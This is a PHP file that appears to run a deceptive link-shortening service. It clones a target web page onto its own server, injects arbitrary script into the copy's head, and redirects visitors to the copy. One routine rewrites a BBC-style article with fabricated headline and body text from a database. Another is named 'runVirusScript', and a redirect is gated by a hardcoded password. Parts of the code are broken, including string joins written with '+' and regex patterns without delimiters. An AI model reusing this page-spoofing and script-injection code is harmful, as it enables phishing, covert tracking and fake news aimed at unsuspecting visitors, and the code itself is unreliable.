<?php
include "../scripts/simple_html_dom.php" ;
include "../php/DataBaseHandling.php";

//STARTS WITH FUNCTION
function startsWith($fullString, $subString) {
    // search backwards starting from haystack length characters from the end
    return $subString === "" || strrpos($fullString, $subString, -strlen($fullString)) !== FALSE;
}

//DUPLICATING HTML FILE ONTO OWN SERVER
function duplicateHtml($link){
    $htmlFileName = "index.html";
    $html=fopen($htmlFileName, "w+");
    fwrite($html , file_get_contents("$link"));
    fclose($html);
    return $htmlFileName;
}

//CREATING PATHS FOR OTHER FILES FOUND IN HTML
function downloadAndCreateImage($link , $htmlFileName){
    $html = file_get_html($htmlFileName);
    foreach($html->find('img') as $element){
        $img = $element->src ;
       if (preg_match('#^https?://#i', $img) === 0) {
           if(startsWith($img , "/")){
            
                $element->src = $link.$img ;    
           }
           else{
            $element->src = $link."/".$img ;
           }
           
       }
    }
    
//    foreach($html->find('link') as $element){
//        $linkRef = $element->href ; 
//       if(preg_match('#^https?://#i', $linkRef) === 0) {
//           if(startsWith($linkRef , "/")){
//               $element->href = $link.$linkRef ;
//           }
//           else{
//               $element->href = $link."/".$linkRef ;
//
//           }
//       }
//    }
    
    
   // changingLinks($html , 1 , $link);

    $html->save($htmlFileName);
    return $html;
 
}


function changingLinks($html , $type , $link){
    
    switch ($type){
        case 1:    
             foreach($html->find('a') as $element){
                    $ref = $element->href ; 
                    if(preg_match('#^https?://#i', $ref) === 0){
                        if(startsWith($ref , "/")){
                            $element->href = $link.$ref;
                        }
                        else{
                            $element->href = $link."/".$ref ;

                        }
                    }
                    $element->href = $link.$ref;
        
             }
             break;
            
        case 2:
             foreach($html->find('a') as $element){
                    $element->href = "$link";
        
             }
             break;
            
    }
    
    
}


function clearHTML($html){
    $html->clear();
        unset($html);
}

function editContents($htmlFileName , $link){
        $conn = openConnection();
    
    $actual_link = "http://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";


    $html = downloadAndCreateImage($link , $htmlFileName);
    changingLinks($html , 2 , $actual_link);

    $news = "";
$news = getNewsFromDatabase($conn); 
    $newsArray = explode(',', $news);
    
    $title = $newsArray[0];
    $imgsrc = $newsArray[1];
    $news = $newsArray[2];
     $header = $newsArray[3];

    foreach($html->find('h1') as $element){
       $element->innertext = "<p>$header</p>";
        break;
    }
    
     foreach($html->find('div.story-body__inner') as $element){
       $element->innertext = "<img class='js-image-replace' width='976' height='549' src='$imgsrc'</img>
       <p class='story-body__introduction'>$title</p><p>$news</p>";
         break;
         
}
    $html->save($htmlFileName);
    closeConnection($conn);
    return $html;
    
}

//OPENING CONNECTION AND GETTING
//REDIRECTING TO LONG LINK
function redirectToOriginalLink($htmlFileName){
    header("access-control-allow-origin: *");
    header("Location: ".$htmlFileName, true, 303);
    die();
}
// MAIN SCRIPT THAT RUNS FOR MOST ATT
function runScript($textToInsert){
    $conn = openConnection();
    //SEARCHING DATABASE WITH KEY TO GET LONGLINK
    //	$jQueryAPI = " <script src='//ajax.googleapis.com/ajax/libs/jquery/1.11.0/jquery.min.js'></script>";

    $key = substr($_SERVER[REQUEST_URI],1,5);
    $link = selectDataFromDatabase($key, $conn);
    $htmlFileName = duplicateHtml($link);
    $html = downloadAndCreateImage($link , $htmlFileName);
     $contents = file_get_contents("$htmlFileName");
     $newContent = preg_replace("<html>", "<html>".$jQueryAPI+$textToInsert, $contents);
     file_put_contents($htmlFileName, $newContent);
    $element = $html->find('head',0);
    $element->innertext = $element->innertext.$textToInsert;
    $html->save($htmlFileName);
    clearHtml($html);
    redirectToOriginalLink($htmlFileName);
    closeConnection($conn);
    
}

function runAffliateScript(){
    $conn = openConnection();
    $key = substr($_SERVER[REQUEST_URI],1,5);
    $link = selectDataFromDatabase($key, $conn);
    header("Location: ".$link, true, 302);
    closeConnection($conn);
}

function runPasswordScript(){
    $conn = openConnection();
    //SEARCHING DATABASE WITH KEY TO GET LONGLINK
    $key = substr($_SERVER[REQUEST_URI],1,5);
    $link = selectArrayFromDatabase($key, $conn);

    if(!is_null($_GET["pass"])){


    if($_GET['pass'] === "123456"){
        $link = (string)$link[1];
    }
    else{
        $link = (string)$link[0];
    }
    }
    else{
        $link = (string)$link[0];
    }
//    $htmlFileName = duplicateHtml($link);
//   $html = downloadAndCreateImage($link ,$htmlFileName);
    redirectToOriginalLink($link);
 //   clearHTML($html);
    //redirectToOriginalLink($htmlFileName);
    closeConnection($conn);
}

function runTrackingScript($textToInsert){
    $conn = openConnection();
    //SEARCHING DATABASE WITH KEY TO GET LONGLINK
    $jQueryAPI = " <script src='//ajax.googleapis.com/ajax/libs/jquery/1.11.0/jquery.min.js'></script>";
    $key = substr($_SERVER[REQUEST_URI],1,5);
    $link = selectDataFromDatabase($key, $conn);
    $htmlFileName = duplicateHtml($link);
    $html = downloadAndCreateImage($link , $htmlFileName);
    clearHTML($html);
    $contents = file_get_contents("$htmlFileName");
    $newContent = preg_replace("</head>", $jQueryAPI+$textToInsert."</head", $contents);
    file_put_contents($htmlFileName, $newContent);
    redirectToOriginalLink($htmlFileName);
    closeConnection($conn);

}

function runBbcScript(){
    $conn = openConnection();
    $key = substr($_SERVER[REQUEST_URI],1,5);
    $link = selectDataFromDatabase($key, $conn);
    $htmlFileName = duplicateHtml($link);
 //  $html =  downloadAndCreateImage($link , $htmlFileName);
    $html =  editContents($htmlFileName, $link);
    clearHTML($html);
    redirectToOriginalLink($htmlFileName);
    closeConnection($conn);   
}

function runVirusScript(){
     $conn = openConnection();
    $key = substr($_SERVER[REQUEST_URI],1,5);
    $link = selectDataFromDatabase($key, $conn);
    redirectToOriginalLink($link);
    closeConnection($conn);   

}



?>
